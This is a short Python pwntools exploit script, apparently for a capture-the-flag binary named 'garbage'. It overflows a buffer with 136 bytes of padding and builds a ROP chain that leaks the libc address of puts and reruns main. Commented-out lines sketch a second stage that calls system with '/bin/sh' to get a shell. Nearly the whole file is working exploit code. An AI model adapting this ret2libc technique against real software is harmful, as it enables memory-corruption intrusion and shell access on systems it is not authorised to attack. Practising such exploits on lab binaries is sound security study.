#!/usr/bin/env python

from pwn import *

p = process('./garbage')
context(os='linux', arch='amd64')
context.log_level = 'debug'

# Automating everything (Well trying to atleast..)
log.info("Mapping binaries")
garbage = ELF('./garbage')
rop = ROP(garbage)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6') # May need to change to so.2

# Stage 1 - Leak ------------------
junk = "A"*136
rop.search(regs=['rdi'], order = 'regs') # Finds gadget
rop.puts(garbage.got['puts']) # Finds puts
rop.call(garbage.symbols['main']) # reruns main
log.info('Stage 1 ROP Chain:\n' + rop.dump())

# Sending payload
payload = junk + str(rop)
p.sendline(payload)

# Cutting puts out of the output
p.recvuntil("access denied.") # Stops right before leak
leaked_puts = p.recv(7).strip().ljust(8, '\x00')
leaked_puts = u64(leaked_puts)
log.info("puts address is: {}".format(hex(leaked_puts)))

# pop_rdi = p64(0x40179b)
# libc_puts = 0x71b00
# libc_sys = 0x44bf0
# libc_sh = 0x181519

# offset = p64(leaked_puts - libc_puts)
# sys = p64(offset + libc_sys)
# sh = p64(offset +  libc_sh)

# payload = junk + pop_rdi + sh + sys

raw_input()
# p.interactive()
